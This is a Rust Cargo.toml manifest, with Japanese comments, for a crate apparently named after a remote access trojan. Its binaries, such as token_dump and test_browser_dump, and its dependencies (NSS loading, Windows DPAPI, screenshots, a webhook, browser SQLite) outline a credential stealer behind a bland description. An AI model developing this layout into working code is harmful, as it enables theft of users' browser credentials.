[package]
name = "rat_64"
version = "0.1.0"
edition = "2021"
default-run = "rat_64"
description = "A high-performance Rust application with modular architecture"
license = "MIT"
readme = "README.md"

[profile.release]
opt-level = 3
lto = "fat"
codegen-units = 1
panic = "abort"
strip = "symbols"
overflow-checks = false
incremental = false
debug = false
rpath = false

[profile.dev]
opt-level = 1
debug = true
overflow-checks = true
incremental = true
debug-assertions = true

# サイズ最適化用
[profile.release-small]
inherits = "release"
opt-level = "z"
lto = "fat"
codegen-units = 1
panic = "abort"
strip = "symbols"

# パフォーマンス最適化用
[profile.performance]
inherits = "release"
opt-level = 3
lto = "fat"
codegen-units = 1

[lib]
name = "rat_64"
path = "src/lib.rs"

[[bin]]
name = "rat_64"
path = "src/main.rs"

[[bin]]
name = "decrypt"
path = "src/bin/decrypt.rs"

[[bin]]
name = "token_dump"
path = "src/bin/token_dump.rs"

[[bin]]
name = "debug_key"
path = "src/bin/debug_key.rs"

[[bin]]
name = "test_os_info"
path = "src/bin/test_os_info.rs"

[[bin]]
name = "test_browser_dump"
path = "src/bin/test_browser_dump.rs"
required-features = ["browser"]

# ---------------------------
# 依存関係（安定運用向け設定）
# ---------------------------
[dependencies]
# Serde は std（derive つき）
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

# 乱数：0.9系（デフォルトfeaturesのまま推奨API rng()/fill を使う）
# 旧API thread_rng() を使い続けたい場合は下のコメント行に切替
rand = "0.9.2"
# rand = { version = "0.9.2", features = ["std", "std_rng", "thread_rng"] }

# MessagePack（最小機能のみ）
rmp-serde = { version = "1.3", default-features = false }

# 基本ユーティリティ（最小化）
base64 = { version = "0.22", default-features = false, features = ["std"] }

# AEAD（最小機能のみ）
aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }

# 並列処理（必要時のみ）
# rayon = "1.11"  # 標準ライブラリのIteratorで置換

# システム情報（最小化）
whoami = { version = "1.5", default-features = false }
local_ipaddress = { version = "0.1", default-features = false }

# 段階的バイナリサイズ削減（保守的アプローチ）
anyhow = "1.0"  # エラー処理の核心部分は保持
# clap = { version = "4.0", features = ["derive"] }  # 標準ライブラリ版CLIで置換完了 ✅
# csv = "1.2"  # 標準ライブラリ版CSVで置換完了 ✅
# dirs = "6.0.0"  # 標準ライブラリで置換完了 ✅
libloading = "0.8"  # NSSで必要
log = "0.4"  # デバッグ用に保持（将来的にprintln!置換）
# shellexpand = "3.0"  # 標準ライブラリで置換完了 ✅
thiserror = "2.0.16"  # エラー処理の核心部分は保持
which = "8.0.0"  # NSSで必要

# chomeium_dump用依存関係（最小化）
indicatif = { version = "0.17", default-features = false, features = ["unicode-width"] }
tempfile = { version = "3.8", default-features = false }
walkdir = { version = "2.3", default-features = false }
# env_logger = "0.10"  # println!マクロで置換
chrono = { version = "0.4", default-features = false, features = ["clock", "std"] }  # 一時的に保持（段階削減のため）

# ---- optional features グループ ----
[features]
default = ["minimal"]
minimal = []
webhook = ["dep:reqwest", "dep:tokio"]
screenshot = ["dep:image", "dep:scrap"]
browser = ["dep:rusqlite"]
database = ["dep:rusqlite"]
extended-modules = ["browser", "screenshot"]
all-modules = ["extended-modules", "webhook"]

# optional deps（必要時だけ読み込む）
[dependencies.reqwest]
version = "0.12"
default-features = false
features = ["json", "rustls-tls", "blocking"]
optional = true

[dependencies.tokio]
version = "1.47"
default-features = false
features = ["rt", "macros"]
optional = true

[dependencies.image]
version = "0.25"
default-features = false
features = ["png", "jpeg"]
optional = true

[dependencies.rusqlite]
version = "0.37.0"
default-features = false
features = ["bundled"]
optional = true

[dependencies.scrap]
version = "0.5"
optional = true

# Windows API（必要最小限のモジュール）
[target.'cfg(windows)'.dependencies]
windows = { version = "0.62.0", default-features = false, features = [
  "Win32_Foundation",
  "Win32_Security",
  "Win32_System_Threading"
] }
winapi = { version = "0.3", features = ["wincrypt", "winbase", "dpapi"] }
